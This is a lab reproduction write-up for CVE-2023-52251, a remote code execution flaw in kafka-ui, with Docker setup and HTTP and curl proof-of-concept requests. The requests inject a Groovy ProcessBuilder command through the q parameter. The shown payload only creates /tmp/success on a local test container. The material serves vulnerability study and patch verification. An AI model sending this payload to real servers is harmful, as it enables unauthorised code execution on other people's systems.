# Groovy Script Execution in Kafka UI (CVE-2023-52251)

## Introduction

An issue discovered in provectus kafka-ui 0.4.0 through 0.7.1 allows remote attackers to execute arbitrary code via the q parameter of /api/clusters/local/topics/{topic}/messages.

## Affect version

[kafka-ui](https://github.com/provectus/kafka-ui) < 0.7.2

## Setup && Poc

```
docker compose up -d
```

Access to `localhost:8091`, create a topic,

```http
POST /api/clusters/local/topics HTTP/1.1
Host: localhost:8091
Content-Length: 92
Content-Type: application/json

{"name":"poc","partitions":1,"configs":{"cleanup.policy":"delete","retention.bytes":"-1"}}
```

and produce a new message,

```http
POST /api/clusters/local/topics/topic/messages HTTP/1.1
Host: localhost:8091
Content-Length: 85
Content-Type: application/json

{"partition":0,"key":"123","content":"123","keySerde":"String","valueSerde":"String"}
```

Send the request below to eval groovy script

```http
GET /api/clusters/local/topics/poc/messages?q=new+ProcessBuilder%28%22touch%22%2C%22%2Ftmp%2Fsuccess%22%29.start%28%29&filterQueryType=GROOVY_SCRIPT HTTP/1.1
Host: localhost:8091
Accept: text/event-stream
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

or 

```bash
curl http://localhost:8091/api/clusters/local/topics/poc/messages?q=new+ProcessBuilder%28%22touch%22%2C%22%2Ftmp%2Fsuccess%22%29.start%28%29&filterQueryType=GROOVY_SCRIPT
```

check the `/tmp/success` file was created

```bash
docker container exec -it cve-2023-52251-kafka-ui-1 /bin/sh
/ $ ls /tmp
hsperfdata_kafkaui  success
```

## References

1. https://nvd.nist.gov/vuln/detail/CVE-2023-52251
2. https://securitylab.github.com/advisories/GHSL-2023-229_GHSL-2023-230_kafka-ui